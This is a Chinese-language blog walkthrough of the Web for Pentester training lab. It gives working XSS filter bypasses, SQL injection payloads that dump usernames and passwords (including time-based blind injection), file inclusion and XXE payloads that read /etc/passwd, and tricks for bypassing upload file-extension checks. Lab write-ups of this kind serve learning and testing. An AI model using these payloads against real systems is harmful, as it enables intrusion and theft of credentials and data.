<!DOCTYPE html>
<html lang="en">
<head><meta name="generator" content="Hexo 3.9.0">
    <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
<meta http-equiv="X-UA-Compatible" content="ie=edge">



<title>Web_for_pentester-01 | Love to share</title>



    <link rel="icon" href="/favicon.ico">




    <!-- stylesheets list from _config.yml -->
    
    <link rel="stylesheet" href="/css/style.css">
    



    <!-- scripts list from _config.yml -->
    
    <script src="/js/script.js"></script>
    


</head>
<body>
    <div class="wrapper">
        <header>
    <nav class="navbar">
        <div class="container">
            <div class="navbar-header header-logo"><a href="/">zhhhy&#39;s Blog</a></div>
            <div class="menu navbar-right">
                
                    <a class="menu-item" href="/archives">Posts</a>
                
                    <a class="menu-item" href="/category">Categories</a>
                
                    <a class="menu-item" href="/tag">Tags</a>
                
                    <a class="menu-item" href="/about">About</a>
                
                <input id="switch_default" type="checkbox" class="switch_default">
                <label for="switch_default" class="toggleBtn"></label>
            </div>

        </div>
    </nav>

    
    <nav class="navbar-mobile" id="nav-mobile">
        <div class="container">
            <div class="navbar-header">
                <div>
                    <a href="/">zhhhy&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
                </div>
                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
            </div>
            <div class="menu" id="mobile-menu">
                
                    <a class="menu-item" href="/archives">Posts</a>
                
                    <a class="menu-item" href="/category">Categories</a>
                
                    <a class="menu-item" href="/tag">Tags</a>
                
                    <a class="menu-item" href="/about">About</a>
                
            </div>
        </div>
    </nav>

</header>
<script>
    var mobileBtn = function f() {
        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
        var mobileMenu = document.getElementById("mobile-menu");
        if(toggleMenu.classList.contains("active")){
           toggleMenu.classList.remove("active")
            mobileMenu.classList.remove("active")
        }else{
            toggleMenu.classList.add("active")
            mobileMenu.classList.add("active")
        }
    }
</script>
        <div class="main">
            <div class="container">
    
    
        <div id="post-toc" class="post-toc">
            <span class="post-toc-title">catalogue</span>
            <div class="post-toc-content">
                <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#xss"><span class="toc-text">xss</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#example-1"><span class="toc-text">example 1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#example-2"><span class="toc-text">example 2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#example-3"><span class="toc-text">example 3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#example-4"><span class="toc-text">example 4</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#example-5"><span class="toc-text">example 5</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Example-6"><span class="toc-text">Example 6</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#example-7"><span class="toc-text">example 7</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#example-8"><span class="toc-text">example 8</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Example-9"><span class="toc-text">Example 9</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Sqli"><span class="toc-text">Sqli</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#example-2-1"><span class="toc-text">example 2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#example-3-1"><span class="toc-text">example 3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#example-4-1"><span class="toc-text">example 4</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#example-5-1"><span class="toc-text">example 5</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#example-6"><span class="toc-text">example 6</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#example-7-1"><span class="toc-text">example 7</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#example-8-1"><span class="toc-text">example 8</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#example-9"><span class="toc-text">example 9</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#文件包含"><span class="toc-text">文件包含</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#example-1-1"><span class="toc-text">example 1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#example-2-2"><span class="toc-text">example 2</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#文件上传"><span class="toc-text">文件上传</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#eaxmple-2"><span class="toc-text">eaxmple 2</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XML—XXE"><span class="toc-text">XML—XXE</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#example-1-2"><span class="toc-text">example 1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exmaple-2"><span class="toc-text">exmaple 2</span></a></li></ol></li></ol>
            </div>
        </div>
    
    
    <article class="post-wrap">
        <header class="post-header">
            <h1 class="post-title">Web_for_pentester-01</h1>
            
                <div class="post-meta">
                    
                        Author: <a itemprop="author" rel="author" href="/">zhhhy</a>
                    

                    
                        <span class="post-time">
                        Date: <a href="#">October 12, 2018&nbsp;&nbsp;14:26:00</a>
                        </span>
                    
                    
                </div>
            
        </header>

        <section class="post-content">
            <p>这个靶场很基础,就是一个认识一下漏洞长啥模样,如何利用.入门挺好的吧…感觉这些我都会做.可我还是个菜鸡啊!:(</p>
<a id="more"></a>

<h2 id="xss"><a href="#xss" class="headerlink" title="xss"></a>xss</h2><h3 id="example-1"><a href="#example-1" class="headerlink" title="example 1"></a>example 1</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;Script&gt;alert()&lt;<span class="regexp">/Script&gt;</span></span><br></pre></td></tr></table></figure>

<p>无任何防护</p>
<h3 id="example-2"><a href="#example-2" class="headerlink" title="example 2"></a>example 2</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;Script&gt;alert()&lt;<span class="regexp">/Script&gt;</span></span><br></pre></td></tr></table></figure>

<p>大小写绕过</p>
<h3 id="example-3"><a href="#example-3" class="headerlink" title="example 3"></a>example 3</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name=&lt;scri&lt;script&gt;pt&gt;alert()&lt;/scri&lt;/script&gt;pt&gt;</span><br></pre></td></tr></table></figure>

<p> 双写绕过.这里被坑了一下</p>
<h3 id="example-4"><a href="#example-4" class="headerlink" title="example 4"></a>example 4</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src = <span class="number">1</span> onerror=alert()&gt;</span><br></pre></td></tr></table></figure>

<p>   script标签被过滤了..无法绕过.发现img,a,等标签可以使用</p>
<h3 id="example-5"><a href="#example-5" class="headerlink" title="example 5"></a>example 5</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;imgsrc=<span class="string">"1"</span>%<span class="number">20</span>onerror=<span class="string">"eval(String.fromCharCode(97,108,101,114,116,40,39,98,39,41)&gt;</span></span><br></pre></td></tr></table></figure>

<p>竟然把alert给过滤了?难道我非要弹窗吗????  confim可以代替alert函数弹窗..</p>
<p>但是比较推荐这个payload.如果实战中关键的函数被过滤了,就可以用这种转码的方式绕过.</p>
<h3 id="Example-6"><a href="#Example-6" class="headerlink" title="Example 6"></a>Example 6</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"&lt;/script&gt;&lt;img%20src="</span><span class="number">1</span><span class="string">"%20onerror=alert()&gt;</span></span><br></pre></td></tr></table></figure>

<p>查看源代码</p>
<p><img src="/.com//1.png" alt></p>
<p>前面闭合双引号和标签.其实也是抱着试一试的心态,js代码不是很懂</p>
<h3 id="example-7"><a href="#example-7" class="headerlink" title="example 7"></a>example 7</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%27;alert()//   <span class="tag">&lt;&gt;</span>”</span><br></pre></td></tr></table></figure>

<p>都被HTML实体化编码了,尝试用单引号闭合成功,但是没弹窗,发现多了个引号</p>
<p>于是构造注释成..</p>
<p><img src="/.com//2.png" alt></p>
<h3 id="example-8"><a href="#example-8" class="headerlink" title="example 8"></a>example 8</h3><p> 在URL里构造 </p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/<span class="string">"&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;form%20action="</span></span><br></pre></td></tr></table></figure>

<p>不太懂为什么这样闭合. 先放着. </p>
<h3 id="Example-9"><a href="#Example-9" class="headerlink" title="Example 9"></a>Example 9</h3><p> URL加上</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#&lt;script&gt;alert(‘1‘)&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>  问题是出在这句上.</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">document</span>.write(location.hash.substring(<span class="number">1</span>));</span><br></pre></td></tr></table></figure>

<h2 id="Sqli"><a href="#Sqli" class="headerlink" title="Sqli"></a>Sqli</h2><h3 id="example-2-1"><a href="#example-2-1" class="headerlink" title="example 2"></a>example 2</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">%09and%091=1%23</span><br><span class="line"></span><br><span class="line">(sleep(ascii(mid(user()from(2)for(1)))=109))   </span><br><span class="line"></span><br><span class="line">1%27/**/union/**/select/**/1,group_concat(name,0xa0,passwd),3,4,5/**/from/**/users%23</span><br></pre></td></tr></table></figure>

<p>空格被过滤 利用注释代替空格</p>
<h3 id="example-3-1"><a href="#example-3-1" class="headerlink" title="example 3"></a>example 3</h3><p> 在服务器里查看了一下两题的源码差别</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\s匹配任何空白字符,包括空格、制表符、换页符等，全部过滤掉</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1%27/**/union/**/select/**/1,group_concat(name,0xa0,passwd),3,4,5/**/from/**/users%23</span><br></pre></td></tr></table></figure>

<p>所以只能用这种payload</p>
<h3 id="example-4-1"><a href="#example-4-1" class="headerlink" title="example 4"></a>example 4</h3><p>数字型注入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=2%20union%20select%201,2,3,4,5</span><br></pre></td></tr></table></figure>

<p>没啥说的</p>
<p>网上的题解是说对单引号进行过滤了,但是却是一个数字型的注入,所以过滤毫无意义,虚拟机分辨率不知道什么情况,不能显示完整的代码.就不贴了,郁闷:(</p>
<h3 id="example-5-1"><a href="#example-5-1" class="headerlink" title="example 5"></a>example 5</h3><p> 看不出和第四关有什么差别…(没有查看源码…还是数字型注入.用第四关的payload就行了.. 有点无语</p>
<p><img src="/.com//3.png" alt></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%20union%20select%201,name,passwd,4,5%20from%20users</span><br></pre></td></tr></table></figure>

<h3 id="example-6"><a href="#example-6" class="headerlink" title="example 6"></a>example 6</h3><p> 这里还是有点小坑的.. 竟然查了一下题解,竟然是判断最后一位字符是不是数字…这是啥防御??</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%20union%20select%201,name,passwd,4,5%20from%20users%20%23%201</span><br></pre></td></tr></table></figure>

<p><img src="/.com//E:web-for-pentester%5C4.png" alt></p>
<p>那就在末尾加上一个数字呗..为了保证语法正确,加上%23注释掉了这个多余的1</p>
<h3 id="example-7-1"><a href="#example-7-1" class="headerlink" title="example 7"></a>example 7</h3><p> 又是一个正则.</p>
<p><img src="/.com//5.png" alt></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">正则 /m 是匹配换行符,也就是说它只判断换行符前的语句是否合法.</span><br><span class="line"></span><br><span class="line"> %0a 就是经过url编码的换行符</span><br></pre></td></tr></table></figure>

<p>payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%0aunion%20select%201,name,passwd,4,5%20from%20users</span><br></pre></td></tr></table></figure>

<h3 id="example-8-1"><a href="#example-8-1" class="headerlink" title="example 8"></a>example 8</h3><p> 不会做的时候..还是选择看看源码吧..(= =我是看题解)</p>
<p>用xor进行语句的链接.</p>
<p>为什么不用or呢?</p>
<p>xor就是10,01这种情况都返回的是1,而00,11,这种情况都是0</p>
<p>即使第一项已经是1,仍然需要判断第二项是1,还是0.这样构造的语句就可以被执行</p>
<p><img src="/.com//6.png" alt></p>
<p>注意时间!!!!  </p>
<p>or 呢,当前面一项已经是1的时候就不执行第二项的式子了</p>
<p><img src="/.com//7.png" alt></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">order=age`%20xor%20if(ascii(substring(user(),1,1))%3E111,sleep(5),0)%23</span><br></pre></td></tr></table></figure>

<p>至于反引号也能理解.. 因为orderby后面拼接的是表名.所以可能用反引号来包裹.</p>
<p>不过.我还是看了源码里面拼接了反引号.而起用了mysql_real_escape_string()对特殊字符进行转义</p>
<h3 id="example-9"><a href="#example-9" class="headerlink" title="example 9"></a>example 9</h3><p>没有了反引号..题解说是被过滤了.<br> 前一项报错,后一项正确</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">order=1%20xor%20if(ascii(substring(user(),1,1))=112,sleep(5),0)%2</span><br></pre></td></tr></table></figure>

<h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><h3 id="example-1-1"><a href="#example-1-1" class="headerlink" title="example 1"></a>example 1</h3><p>直接读取到etc/password文件</p>
<p>payload</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">http:</span>//<span class="attr">xxxxx</span>/<span class="attr">fileincl</span>/<span class="attr">example1.php</span>?<span class="attr">page</span>=<span class="string">php://filter/read</span>=<span class="string">convert.base64-encode/resource</span>=<span class="string">../../../../../../../etc/passwd</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="example-2-2"><a href="#example-2-2" class="headerlink" title="example 2"></a>example 2</h3><p>用上一个payload回报错.发现文件名写死为.php了</p>
<p>那么! 就%00截断吧</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xxxxx/fileincl/example2.php?page=php://filter/read=convert.base64-encode/resource=../../../../../../../etc/passwd%00</span><br></pre></td></tr></table></figure>

<h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><p>第一关没啥好说,直接php文件就成功了</p>
<h3 id="eaxmple-2"><a href="#eaxmple-2" class="headerlink" title="eaxmple 2"></a>eaxmple 2</h3><p>测试发现,他是判断末尾是否为php</p>
<p>于是利用php的别名 php3,pht等等就可以绕过</p>
<p>大小写也可以绕过</p>
<p>还有一种 构造成1.jpg.php.   注意最后有一个点!</p>
<p>抓包修改文件后缀</p>
<p><img src="/.com//8.png" alt></p>
<p>访问就可以执行php代码了</p>
<p><img src="/.com//9.png" alt></p>
<h2 id="XML—XXE"><a href="#XML—XXE" class="headerlink" title="XML—XXE"></a>XML—XXE</h2><h3 id="example-1-2"><a href="#example-1-2" class="headerlink" title="example 1"></a>example 1</h3><p>payload</p>
<p>XXE原理以及利用方式之前写了一点点.<a href="https://zhhhy.github.io/2018/08/21/XXE/#more" target="_blank" rel="noopener">https://zhhhy.github.io/2018/08/21/XXE/#more</a></p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span><span class="meta">&lt;!DOCTYPE ANY [&lt;!ENTITY test SYSTEM "file:///etc/passwd"&gt;]&gt;</span><span class="tag">&lt;<span class="name">abc</span>&gt;</span>&amp;test;<span class="tag">&lt;/<span class="name">abc</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>要进行URL加密…可是hackbar加密出来的有问题…死活提交不对.拿到解码网站去就ok了;</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%3c%3fxml+version%3d%221.0%22%3f%3e%3c!DOCTYPE+ANY+%5b%3c!ENTITY+test+SYSTEM+%22file%3a%2f%2f%2fetc%2fpasswd%22%3e%5d%3e%3cabc%3e%26test%3b%3c%2fabc%3e</span><br></pre></td></tr></table></figure>

<h3 id="exmaple-2"><a href="#exmaple-2" class="headerlink" title="exmaple 2"></a>exmaple 2</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">http:</span>//<span class="attr">192.168.43.217</span>/<span class="attr">xml</span>/<span class="attr">example2.php</span>?<span class="attr">name</span>=<span class="string">hacker%20%27or%201</span>=<span class="string">1]/parent::*/child::node()%00</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>对xxe注入没什么研究</p>

        </section>

        
            <section class="post-copyright">
                
                    <p class="copyright-item">
                        <span>Author:</span>
                        <span>zhhhy</span>
                    </p>
                
                
                    <p class="copyright-item">
                        <span>Permalink:</span>
                        <span><a href="http://yoursite.com/2018/10/12/web-for-pentester/">http://yoursite.com/2018/10/12/web-for-pentester/</a></span>
                    </p>
                
                
                    <p class="copyright-item">
                        <span>License:</span>
                        <span>Copyright (c) 2019 <a href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
                    </p>
                
                
                     <p class="copyright-item">
                         <span>Solgan:</span>
                         <span>Do you believe in <strong>DESTINY<strong>?</strong></strong></span>
                     </p>
                

            </section>
        
        <section class="post-tags">
            <div>
                <span>Tag(s):</span>
                <span class="tag">
                    
                </span>
            </div>
            <div>
                <a href="javascript:window.history.back();">back</a>
                <span>· </span>
                <a href="/">home</a>
            </div>
        </section>
        <section class="post-nav">
            
                <a class="prev" rel="prev" href="/2018/10/13/Web-for-pentester-02/">Web_for_pentester-02</a>
            
            
            <a class="next" rel="next" href="/2018/09/27/zzcms8-2/">ZZCMS8.2 sql注入+任意文件删除+配置文件写入问题=GetShell</a>
            
        </section>


    </article>
</div>
        </div>
        <footer id="footer" class="footer">
    <div class="copyright">
        <span>© zhhhy | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Sirice19/hexo-theme-Chic" target="_blank">Chic</a></span>
    </div>
</footer>
    </div>
</body>
</html>